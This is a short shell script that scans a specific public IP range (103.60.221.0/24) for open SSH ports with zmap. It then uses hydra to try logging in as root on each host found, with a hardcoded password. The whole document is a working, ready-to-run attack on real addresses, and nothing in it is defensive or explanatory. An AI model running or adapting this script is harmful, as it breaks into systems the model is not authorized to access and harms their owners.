#!/bin/sh
zmap -p 22 -o 22.txt 103.60.221.0/24
hydra -l root -p ky123..com -M 22.txt -o 22 ssh
